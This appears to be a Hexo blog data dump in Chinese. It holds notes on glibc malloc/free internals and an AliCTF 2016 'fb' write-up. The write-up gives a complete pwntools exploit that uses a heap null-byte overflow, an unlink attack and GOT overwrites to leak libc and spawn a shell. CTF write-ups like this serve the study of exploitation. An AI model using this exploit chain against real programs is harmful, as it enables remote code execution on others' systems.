href=\"https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/\">这篇分析</a>之后感觉在过程上还是不够清晰，于是自己找来Glibc 2.23.90的源码分析了一遍，做了流程上的整理放在这里。链接中已经详细剖析过的结构体等等就不再赘述，主要整理下分配及释放的过程。</p>","more":"<h2 id=\"分配\"><a href=\"#分配\" class=\"headerlink\" title=\"分配\"></a>分配</h2><p>（fastbin的分配发生在链表的头部，其余都发生在链表尾部）<br>（在fast链表中是精确分配（只有大小完全符合才会分配）<br>    unsorted链表除非是remainder chunk时非精确分配，其余都是精确分配<br>    small链表在第一遍时是精确分配，第二遍时非精确<br>    large链表一直都是非精确分配）（注意链表和chunk不一样）<br>（为毛top chunk必须置位prev_inuse位？翻找了一下说是规定。。。）</p>\n<p>1、首先获取Arena的锁，保证安全<br>2、进行chunk的size检查等（包括将请求size转换为chunk的size，将传入malloc的size加上8 bytes的overhead并向16 bytes对齐（32位下是8 bytes），32位下最小为16bytes，64位下最小为32bytes）<br>——一种情况是没有可用Arena<br>没有可用Arena会直接交由sysmalloc处理，进入后直接尝试mmap分配，失败返回0<br>——另一种情况是有可用Arena<br>1、如果请求属于Fast bin大小，就从Fast bin中分配，失败则进行normal bin的分配过程（分配成功后有fastbin的index的反向计算的安全检查再返回）（中间运用了原子操作来优化从链表中删除chunk）<br>2、然后再判断是否属于small bin，是的话找到对应bin链表的最后一个chunk进行分配（期间也有安全性检查，到small bin时才会有arena的初始化检查），否则计算再large bin中的index再清fastbin，进入下一步（在这一步时确定了index）<br>3、开始遍历unsorted bin，如果属于small bin且Last Remainder chunk是unsorted bin 中的唯一一个chunk并且能够满足大小，那么切割这一chunk进行分配，并把剩余部分继续成为remainder chunk放入unsorted bin，如果大小能够精确匹配目标（不管是small还是large），就分配这一chunk返回，否则放入相应的small 链表或large 链表（维持large 链表从大到小的顺序），遍历unsorted bin不会超过MAX_ITERS，超过的话即使unsorted 链表中还有可能可以分配的chunk也直接到下一步<br>4、如果是large bin，根据算出的index找到对应链表，如果链表为空或者链表中的最大chunk也不能满足，进入下一步，否则就开始倒序查找（使用nextsize指针，该指针指向下一个不同大小的正序中的第一个的chunk），找到后分割返回（如果分割后剩余大小不够MINSIZE就不分割），把分割后的chunk放入unsorted bin头部（如果该chunk为large 设置该chunk的两个nextsize指针为NULL）<br>5、使用binmap从之前确立的bins中的index链表开始，使用binmap加快搜索，找到最适合的可分配的链表（使用位运算，如果没有直接跳到下一步），然后拿出链表最后一个chunk（大小肯定是够的），然后分割分配（如果分割之后的大小小于MINSIZE就不尽兴分割），然后剩下的成为remainder chunk放入unsorted bin头部（和之前一样），然后返回<br>6、开始使用top chunk分配，先看top能不能满足，如果能满足切割分配，剩下的继续成为top chunk，否则看是否还有fastbin，如果有进行清fastbin操作再重新计算index，跳转到3继续循环（源码注释中说这样的循环最多这么一次，因为本来唯一可能循环的路径（存在fastbin）下一次不可能再满足），否则进行sysmalloc然后返回</p>\n<h4 id=\"关于sysmalloc\"><a href=\"#关于sysmalloc\" class=\"headerlink\" title=\"关于sysmalloc\"></a>关于sysmalloc</h4><p>1、只要要分配的chunk大小超过阈值且已经mmap的内存数量没超过阈值，就会进行mmap分配（或者没有获取到arena也会mmap，mmap分配失败就会直接返回0）<br>2、然后看是否是main_arena，不是的话试图grow当前heap，失败则mmap一个新的heap，开辟新的heap后将old top chunk末端设置两个fencepost（就是一个极小的被标记为以使用的chunk，应该比MINSIZE还小，应该是8字节，在当前heap的最末端，如果top chunk大小不够MINSIZE，就全部设置为fencepost），然后free掉被删掉fencepost的top chunk（应该是放入到unsorted中），如果尝试new_heap也失败了还没有试过mmap分配，去尝试mmap分配<br>如果是main_arena，调整所需的size进行brk分配，失败则尝试mmap分配，然后根据结果进行调整（处理一下分配失败、brk不增反减的情况，处理contiguous标志等等）<br>最后再从top chunk中分配</p>\n<h4 id=\"按fast-bin、small-bin、large-bin分\"><a href=\"#按fast-bin、small-bin、large-bin分\" class=\"headerlink\" title=\"按fast bin、small bin、large bin分\"></a>按fast bin、small bin、large bin分</h4><p>1、fast bin就是看一下fast链表，有正好合适的就分，否则和small 一样<br>2、small bin先看small bins中有没有，然后遍历unsorted bin寻找（通过精确或者remainder，unsorted chunk 会被放回相应的small bin或large bin），然后使用binmap进行尽量合适分配（任何一次分割剩下的会成为remainder chunk，除了top），再不然就top或找系统<br>3、large bin直接找unsorted bin，不行就往后找（使用binmap），否则top或系统</p>\n<h4 id=\"关于巨块的分配\"><a href=\"#关于巨块的分配\" class=\"headerlink\" title=\"关于巨块的分配\"></a>关于巨块的分配</h4><p>没有看到源代码中有对于巨块的直接交给mmap处理的代码，应该是跟着整个流程走一遍然后能分配就分配否则mmap<br>mmap分配的未必就一定是大的chunk</p>\n<h2 id=\"释放\"><a href=\"#释放\" class=\"headerlink\" title=\"释放\"></a>释放</h2><p>（所有chunk的释放都是插入链表头部）<br>然后做一些基本的检查，比如size大小等<br>1、如果是fast bin直接返回给fast bin，在fast bin中不会发生合并（chunk一直被标记为占用）<br>2、然后如果不是mmap的内存（属于normal bin），看看前后能不能合并，能合并就合并后加入到unsorted bin链表头<br>合并之后看合并之后的chunk的size，如果大于FASTBIN_CONSOLIDATION_THRESHOLD，会清fastbin，能合并的合并，然后全部放到unsorted bin链表中，然后试图收缩heap<br>（其中如果回收的块是和top chunk相邻的，就直接合并到top chunk中去（如果TRIM_FASTBINS为1（我看到的源码里默认为0），fastbin也会进行合并，否则不合并），并且这些操作中间或有获取锁的操作保证安全）<br>3、直接munmap返回给操作系统</p>\n<h4 id=\"来自源码中的注释\"><a href=\"#来自源码中的注释\" class=\"headerlink\" title=\"来自源码中的注释\"></a>来自源码中的注释</h4><p>chunk不会被放回到normal bin中直到它们获得一次被malloc的机会<br>Chunks are not placed into regular bins until after they have been given one chance to be used in malloc</p>\n<h4 id=\"关于获取Size\"><a href=\"#关于获取Size\" class=\"headerlink\" title=\"关于获取Size\"></a>关于获取Size</h4><p>获取fd的size是将当前指针＋当前size后－4，获取bk的size是直接用当前chunk中的prev_size（如果前一个chunk正在使用的话似乎也不用获取他的size）</p>\n<h2 id=\"关于堆的收缩\"><a href=\"#关于堆的收缩\" class=\"headerlink\" title=\"关于堆的收缩\"></a>关于堆的收缩</h2><p>如果top chunk的大小过大（应该是超过一个heap segment，但是参考中的中文资料说子线程中的Top chunk一旦达到一个Heap Segment大小就会在这次free操作时归还给操作系统，但是如果整好处于边缘值岂不会造成mmap－munmap－mmap－munmap的浪费操作？）会将这块内存还给系统，但是会至少留下一部分内存继续作为top chunk</p>\n<h4 id=\"来自源码中的注释-1\"><a href=\"#来自源码中的注释-1\" class=\"headerlink\" title=\"来自源码中的注释\"></a>来自源码中的注释</h4><p>收缩过程使用madvise的MADV_DONTNEED标志，表明这块内存不会再被访问，这是向内存管理器发出的建议，内存管理器会采取适当处理</p>\n<p>最后附一张图：<br><img src=\"/images/linux_heap_analysis0.png\" alt=\"heap.png\"></p>"},{"title":"AliCTF 2016 fb writeup","date":"2016-06-07T12:33:00.000Z","_content":"\n一道堆中的null byte溢出题\n\n程序用连续两个8 bytes变量分别存储分配的堆指针和其size，然后将这样的结构体以数组的形式存储在全局变量区0x6020C0。主要逻辑就是每次新建一个message的时候，从0x6020C0开始找size为0的地方，之后调用malloc分配目标大小存储堆指针，删除的时候会先清size为0再调用free()释放内存\n\n<!--more-->\n\n由于读取输入的时候会在最后再添加'\\x00'：\n```\n.text:00000000004008E4                 cdqe\n.text:00000000004008E6                 lea     rdx, [rax-1]\n.text:00000000004008EA                 mov     rax, [rbp+var_18]\n.text:00000000004008EE                 add     rax, rdx\n.text:00000000004008F1                 mov     byte ptr [rax], 0\n.text:00000000004008F4                 mov     eax, [rbp+var_8]\n.text:00000000004008F7                 sub     eax, 1\n```\n\n所以可以构造payload溢出下一块chunk的size中的prev_inuse位，伪造prevsize字段，触发free()向前合并，就可以导致unlink使用我们伪造的fd和bk指针改写当前chunk的堆指针，使其指向0x6020C8（一开始忘了堆的对齐是加8 bytes再对齐，结果怎么也溢不出来...）\n\n之后再编辑被修改过的堆指针就可以直接修改全局变量区了，由于只开了Partial级别的RELRO：\n\n```\nCANARY    : ENABLED\nFORTIFY   : disabled\nNX        : ENABLED\nPIE       : disabled\nRELRO     : Partial\n```\n所以可以考虑劫持free()的GOT到库中的system()，然后再有一个/bin/sh写在chunk中就可以拿shell了，在这之前得先泄漏一下库的地址过掉ASLR，所以先把free的GOT劫持到puts的PLT上，泄漏一下read()的地址，这里可以用[libc-database][1]这个工具来查找远程库的版本（但是不知道为什么我本地的库版本查不出来，只能手动查偏移），因为ASLR不会影响低12位的地址\n\n然后泄漏出来算下偏移就可以调用system()了\n\n\n\nExploit:\n\n```\n# -*- coding: utf-8 -*-\nfrom pwn import *\n\nio=process('./fb')\n# io = remote(\"114.55.103.213\",9733)\n\nSIZE=0xf8\nPLT_puts=0x4006C0\nGOT_free=0x602018\nGOT_read=0x602040\nFD=0x6020C8\nBK=0x6020D0\n\ndef init(size):\n\tio.recvuntil('Choice:')\n\tio.sendline('1')\n\tio.recvuntil('length:')\n\tio.sendline(str(size))\n\tio.recvuntil('Done~')\n\ndef edit(index,content):\n\tio.recvuntil('Choice:')\n\tio.sendline('2')\n\tio.recvuntil('index:')\n\tio.sendline(str(index))\n\tio.recvuntil('content:')\n\tio.sendline(str(content))\n\tio.recvuntil('Done~')\n\ndef delete(index):\n\tio.recvuntil('Choice:')\n\tio.sendline('3')\n\tio.recvuntil('index:')\n\tio.sendline(str(index))\n\tio.recvuntil('Done~')\n\ndef leak(dst):\n\tedit(1,p64(dst)+p64(SIZE)[:-1])\n\tio.recvuntil('Choice:')\n\tio.sendline('3')\n\tio.recvuntil('index:')\n\tio.sendline('0')\n\tleakmem = io.recvuntil(\"Done~\")[:-6]\n\treturn str(leakmem)\n\ndef main():\n\n\tinit(SIZE)\n\tinit(SIZE)\n\tinit(SIZE)\n\tinit(SIZE)\n\tinit(SIZE)\n\n\tpayload=p64(0xf1)+p64(0xf1)+p64(FD)+p64(BK)+'A'*0xd0+p64(0xf0)\n\t# overflow null byte\n\tedit(2,payload)\n        # gdb.attach(io,execute=(\"b *%s\"%(0x400CCF)))\n\tdelete(3)\n        \n\tpayload2=p64(SIZE)+p64(0x6020C0)+p64(SIZE)+p64(GOT_free)+p64(SIZE)\n\tedit(2,payload2)\n\n\t# modify GOT entry of free to PLT entry of puts\n\t# use [:1] to prevent \\x00 from causing damage\n\tedit(2,p64(PLT_puts)[:-1])\n\n\t# leak read_addr\n\tread_addr=u64(leak(GOT_read).ljust(8,'\\x00'))\n\tprint \"read_addr: \"+str(hex(read_addr))\n\n\n\tsystem_addr=read_addr-0x980C0\n\t# system_addr= read_addr-0xeb6a0 +0x46590\n\t\n\t# modify free to system\n\tedit(2,p64(system_addr)[:-1])\n\tedit(4,\"/bin/sh\")\n\t\n\t# now get shell\n\tio.recvuntil('Choice:')\n\tio.sendline('3')\n\tio.recvuntil('index:')\n\tio.sendline('4')\n\n\tio.interactive()\n\nmain()\n\n\n```\n\n\n[1]: https://github.com/niklasb/libc-database","source":"_posts/alictf_2016_fb_writeup.md","raw":"title: AliCTF 2016 fb writeup\n\ndate: 2016/06/07 20:33:00\n\n---\n\n一道堆中的null byte溢出题\n\n程序用连续两个8 bytes变量分别存储分配的堆指针和其size，然后将这样的结构体以数组的形式存储在全局变量区0x6020C0。主要逻辑就是每次新建一个message的时候，从0x6020C0开始找size为0的地方，之后调用malloc分配目标大小存储堆指针，删除的时候会先清size为0再调用free()释放内存\n\n<!--more-->\n\n由于读取输入的时候会在最后再添加'\\x00'：\n```\n.text:00000000004008E4                 cdqe\n.text:00000000004008E6                 lea     rdx, [rax-1]\n.text:00000000004008EA                 mov     rax, [rbp+var_18]\n.text:00000000004008EE                 add     rax, rdx\n.text:00000000004008F1                 mov     byte ptr [rax], 0\n.text:00000000004008F4                 mov     eax, [rbp+var_8]\n.text:00000000004008F7                 sub     eax, 1\n```\n\n所以可以构造payload溢出下一块chunk的size中的prev_inuse位，伪造prevsize字段，触发free()向前合并，就可以导致unlink使用我们伪造的fd和bk指针改写当前chunk的堆指针，使其指向0x6020C8（一开始忘了堆的对齐是加8 bytes再对齐，结果怎么也溢不出来...）\n\n之后再编辑被修改过的堆指针就可以直接修改全局变量区了，由于只开了Partial级别的RELRO：\n\n```\nCANARY    : ENABLED\nFORTIFY   : disabled\nNX        : ENABLED\nPIE       : disabled\nRELRO     : Partial\n```\n所以可以考虑劫持free()的GOT到库中的system()，然后再有一个/bin/sh写在chunk中就可以拿shell了，在这之前得先泄漏一下库的地址过掉ASLR，所以先把free的GOT劫持到puts的PLT上，泄漏一下read()的地址，这里可以用[libc-database][1]这个工具来查找远程库的版本（但是不知道为什么我本地的库版本查不出来，只能手动查偏移），因为ASLR不会影响低12位的地址\n\n然后泄漏出来算下偏移就可以调用system()了\n\n\n\nExploit:\n\n```\n# -*- coding: utf-8 -*-\nfrom pwn import *\n\nio=process('./fb')\n# io = remote(\"114.55.103.213\",9733)\n\nSIZE=0xf8\nPLT_puts=0x4006C0\nGOT_free=0x602018\nGOT_read=0x602040\nFD=0x6020C8\nBK=0x6020D0\n\ndef init(size):\n\tio.recvuntil('Choice:')\n\tio.sendline('1')\n\tio.recvuntil('length:')\n\tio.sendline(str(size))\n\tio.recvuntil('Done~')\n\ndef edit(index,content):\n\tio.recvuntil('Choice:')\n\tio.sendline('2')\n\tio.recvuntil('index:')\n\tio.sendline(str(index))\n\tio.recvuntil('content:')\n\tio.sendline(str(content))\n\tio.recvuntil('Done~')\n\ndef delete(index):\n\tio.recvuntil('Choice:')\n\tio.sendline('3')\n\tio.recvuntil('index:')\n\tio.sendline(str(index))\n\tio.recvuntil('Done~')\n\ndef leak(dst):\n\tedit(1,p64(dst)+p64(SIZE)[:-1])\n\tio.recvuntil('Choice:')\n\tio.sendline('3')\n\tio.recvuntil('index:')\n\tio.sendline('0')\n\tleakmem = io.recvuntil(\"Done~\")[:-6]\n\treturn str(leakmem)\n\ndef main():\n\n\tinit(SIZE)\n\tinit(SIZE)\n\tinit(SIZE)\n\tinit(SIZE)\n\tinit(SIZE)\n\n\tpayload=p64(0xf1)+p64(0xf1)+p64(FD)+p64(BK)+'A'*0xd0+p64(0xf0)\n\t# overflow null byte\n\tedit(2,payload)\n        # gdb.attach(io,execute=(\"b *%s\"%(0x400CCF)))\n\tdelete(3)\n        \n\tpayload2=p64(SIZE)+p64(0x6020C0)+p64(SIZE)+p64(GOT_free)+p64(SIZE)\n\tedit(2,payload2)\n\n\t# modify GOT entry of free to PLT entry of puts\n\t# use [:1] to prevent \\x00 from causing damage\n\tedit(2,p64(PLT_puts)[:-1])\n\n\t# leak read_addr\n\tread_addr=u64(leak(GOT_read).ljust(8,'\\x00'))\n\tprint \"read_addr: \"+str(hex(read_addr))\n\n\n\tsystem_addr=read_addr-0x980C0\n\t# system_addr= read_addr-0xeb6a0 +0x46590\n\t\n\t# modify free to system\n\tedit(2,p64(system_addr)[:-1])\n\tedit(4,\"/bin/sh\")\n\t\n\t# now get shell\n\tio.recvuntil('Choice:')\n\tio.sendline('3')\n\tio.recvuntil('index:')\n\tio.sendline('4')\n\n\tio.interactive()\n\nmain()\n\n\n```\n\n\n[1]: https://github.com/niklasb/libc-database","slug":"alictf_2016_fb_writeup","published":1,"updated":"2016-11-01T12:18:38.356Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciuzgpo6y0000y060u1e5leid","content":"<p>一道堆中的null byte溢出题</p>\n<p>程序用连续两个8 bytes变量分别存储分配的堆指针和其size，然后将这样的结构体以数组的形式存储在全局变量区0x6020C0。主要逻辑就是每次新建一个message的时候，从0x6020C0开始找size为0的地方，之后调用malloc分配目标大小存储堆指针，删除的时候会先清size为0再调用free()释放内存</p>\n<a id=\"more\"></a>\n<p>由于读取输入的时候会在最后再添加’\\x00’：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">.text:00000000004008E4                 cdqe</div><div class=\"line\">.text:00000000004008E6                 lea     rdx, [rax-1]</div><div class=\"line\">.text:00000000004008EA                 mov     rax, [rbp+var_18]</div><div class=\"line\">.text:00000000004008EE                 add     rax, rdx</div><div class=\"line\">.text:00000000004008F1                 mov     byte ptr [rax], 0</div><div class=\"line\">.text:00000000004008F4                 mov     eax, [rbp+var_8]</div><div class=\"line\">.text:00000000004008F7                 sub     eax, 1</div></pre></td></tr></table></figure></p>\n<p>所以可以构造payload溢出下一块chunk的size中的prev_inuse位，伪造prevsize字段，触发free()向前合并，就可以导致unlink使用我们伪造的fd和bk指针改写当前chunk的堆指针，使其指向0x6020C8（一开始忘了堆的对齐是加8 bytes再对齐，结果怎么也溢不出来…）</p>\n<p>之后再编辑被修改过的堆指针就可以直接修改全局变量区了，由于只开了Partial级别的RELRO：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">CANARY    : ENABLED</div><div class=\"line\">FORTIFY   : disabled</div><div class=\"line\">NX        : ENABLED</div><div class=\"line\">PIE       : disabled</div><div class=\"line\">RELRO     : Partial</div></pre></td></tr></table></figure>\n<p>所以可以考虑劫持free()的GOT到库中的system()，然后再有一个/bin/sh写在chunk中就可以拿shell了，在这之前得先泄漏一下库的地址过掉ASLR，所以先把free的GOT劫持到puts的PLT上，泄漏一下read()的地址，这里可以用<a href=\"https://github.com/niklasb/libc-database\" target=\"_blank\" rel=\"external\">libc-database</a>这个工具来查找远程库的版本（但是不知道为什么我本地的库版本查不出来，只能手动查偏移），因为ASLR不会影响低12位的地址</p>\n<p>然后泄漏出来算下偏移就可以调用system()了</p>\n<p>Exploit:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div></pre></td><td class=\"code\"><pre><div class=\"line\"># -*- coding: utf-8 -*-</div><div class=\"line\">from pwn import *</div><div class=\"line\"></div><div class=\"line\">io=process(&apos;./fb&apos;)</div><div class=\"line\"># io = remote(&quot;114.55.103.213&quot;,9733)</div><div class=\"line\"></div><div class=\"line\">SIZE=0xf8</div><div class=\"line\">PLT_puts=0x4006C0</div><div class=\"line\">GOT_free=0x602018</div><div class=\"line\">GOT_read=0x602040</div><div class=\"line\">FD=0x6020C8</div><div class=\"line\">BK=0x6020D0</div><div class=\"line\"></div><div class=\"line\">def init(size):</div><div class=\"line\">\tio.recvuntil(&apos;Choice:&apos;)</div><div class=\"line\">\tio.sendline(&apos;1&apos;)</div><div class=\"line\">\tio.recvuntil(&apos;length:&apos;)</div><div class=\"line\">\tio.sendline(str(size))</div><div class=\"line\">\tio.recvuntil(&apos;Done~&apos;)</div><div class=\"line\"></div><div class=\"line\">def edit(index,content):</div><div class=\"line\">\tio.recvuntil(&apos;Choice:&apos;)</div><div class=\"line\">\tio.sendline(&apos;2&apos;)</div><div class=\"line\">\tio.recvuntil(&apos;index:&apos;)</div><div class=\"line\">\tio.sendline(str(index))</div><div class=\"line\">\tio.recvuntil(&apos;content:&apos;)</div><div class=\"line\">\tio.sendline(str(content))</div><div class=\"line\">\tio.recvuntil(&apos;Done~&apos;)</div><div class=\"line\"></div><div class=\"line\">def delete(index):</div><div class=\"line\">\tio.recvuntil(&apos;Choice:&apos;)</div><div class=\"line\">\tio.sendline(&apos;3&apos;)</div><div class=\"line\">\tio.recvuntil(&apos;index:&apos;)</div><div class=\"line\">\tio.sendline(str(index))</div><div class=\"line\">\tio.recvuntil(&apos;Done~&apos;)</div><div class=\"line\"></div><div class=\"line\">def leak(dst):</div><div class=\"line\">\tedit(1,p64(dst)+p64(SIZE)[:-1])</div><div class=\"line\">\tio.recvuntil(&apos;Choice:&apos;)</div><div class=\"line\">\tio.sendline(&apos;3&apos;)</div><div class=\"line\">\tio.recvuntil(&apos;index:&apos;)</div><div class=\"line\">\tio.sendline(&apos;0&apos;)</div><div class=\"line\">\tleakmem = io.recvuntil(&quot;Done~&quot;)[:-6]</div><div class=\"line\">\treturn str(leakmem)</div><div class=\"line\"></div><div class=\"line\">def main():</div><div class=\"line\"></div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\"></div><div class=\"line\">\tpayload=p64(0xf1)+p64(0xf1)+p64(FD)+p64(BK)+&apos;A&apos;*0xd0+p64(0xf0)</div><div class=\"line\">\t# overflow null byte</div><div class=\"line\">\tedit(2,payload)</div><div class=\"line\">        # gdb.attach(io,execute=(&quot;b *%s&quot;%(0x400CCF)))</div><div class=\"line\">\tdelete(3)</div><div class=\"line\">        </div><div class=\"line\">\tpayload2=p64(SIZE)+p64(0x6020C0)+p64(SIZE)+p64(GOT_free)+p64(SIZE)</div><div class=\"line\">\tedit(2,payload2)</div><div class=\"line\"></div><div class=\"line\">\t# modify GOT entry of free to PLT entry of puts</div><div class=\"line\">\t# use [:1] to prevent \\x00 from causing damage</div><div class=\"line\">\tedit(2,p64(PLT_puts)[:-1])</div><div class=\"line\"></div><div class=\"line\">\t# leak read_addr</div><div class=\"line\">\tread_addr=u64(leak(GOT_read).ljust(8,&apos;\\x00&apos;))</div><div class=\"line\">\tprint &quot;read_addr: &quot;+str(hex(read_addr))</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">\tsystem_addr=read_addr-0x980C0</div><div class=\"line\">\t# system_addr= read_addr-0xeb6a0 +0x46590</div><div class=\"line\">\t</div><div class=\"line\">\t# modify free to system</div><div class=\"line\">\tedit(2,p64(system_addr)[:-1])</div><div class=\"line\">\tedit(4,&quot;/bin/sh&quot;)</div><div class=\"line\">\t</div><div class=\"line\">\t# now get shell</div><div class=\"line\">\tio.recvuntil(&apos;Choice:&apos;)</div><div class=\"line\">\tio.sendline(&apos;3&apos;)</div><div class=\"line\">\tio.recvuntil(&apos;index:&apos;)</div><div class=\"line\">\tio.sendline(&apos;4&apos;)</div><div class=\"line\"></div><div class=\"line\">\tio.interactive()</div><div class=\"line\"></div><div class=\"line\">main()</div></pre></td></tr></table></figure>\n","excerpt":"<p>一道堆中的null byte溢出题</p>\n<p>程序用连续两个8 bytes变量分别存储分配的堆指针和其size，然后将这样的结构体以数组的形式存储在全局变量区0x6020C0。主要逻辑就是每次新建一个message的时候，从0x6020C0开始找size为0的地方，之后调用malloc分配目标大小存储堆指针，删除的时候会先清size为0再调用free()释放内存</p>","more":"<p>由于读取输入的时候会在最后再添加’\\x00’：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">.text:00000000004008E4                 cdqe</div><div class=\"line\">.text:00000000004008E6                 lea     rdx, [rax-1]</div><div class=\"line\">.text:00000000004008EA                 mov     rax, [rbp+var_18]</div><div class=\"line\">.text:00000000004008EE                 add     rax, rdx</div><div class=\"line\">.text:00000000004008F1                 mov     byte ptr [rax], 0</div><div class=\"line\">.text:00000000004008F4                 mov     eax, [rbp+var_8]</div><div class=\"line\">.text:00000000004008F7                 sub     eax, 1</div></pre></td></tr></table></figure></p>\n<p>所以可以构造payload溢出下一块chunk的size中的prev_inuse位，伪造prevsize字段，触发free()向前合并，就可以导致unlink使用我们伪造的fd和bk指针改写当前chunk的堆指针，使其指向0x6020C8（一开始忘了堆的对齐是加8 bytes再对齐，结果怎么也溢不出来…）</p>\n<p>之后再编辑被修改过的堆指针就可以直接修改全局变量区了，由于只开了Partial级别的RELRO：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">CANARY    : ENABLED</div><div class=\"line\">FORTIFY   : disabled</div><div class=\"line\">NX        : ENABLED</div><div class=\"line\">PIE       : disabled</div><div class=\"line\">RELRO     : Partial</div></pre></td></tr></table></figure>\n<p>所以可以考虑劫持free()的GOT到库中的system()，然后再有一个/bin/sh写在chunk中就可以拿shell了，在这之前得先泄漏一下库的地址过掉ASLR，所以先把free的GOT劫持到puts的PLT上，泄漏一下read()的地址，这里可以用<a href=\"https://github.com/niklasb/libc-database\">libc-database</a>这个工具来查找远程库的版本（但是不知道为什么我本地的库版本查不出来，只能手动查偏移），因为ASLR不会影响低12位的地址</p>\n<p>然后泄漏出来算下偏移就可以调用system()了</p>\n<p>Exploit:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div></pre></td><td class=\"code\"><pre><div class=\"line\"># -*- coding: utf-8 -*-</div><div class=\"line\">from pwn import *</div><div class=\"line\"></div><div class=\"line\">io=process(&apos;./fb&apos;)</div><div class=\"line\"># io = remote(&quot;114.55.103.213&quot;,9733)</div><div class=\"line\"></div><div class=\"line\">SIZE=0xf8</div><div class=\"line\">PLT_puts=0x4006C0</div><div class=\"line\">GOT_free=0x602018</div><div class=\"line\">GOT_read=0x602040</div><div class=\"line\">FD=0x6020C8</div><div class=\"line\">BK=0x6020D0</div><div 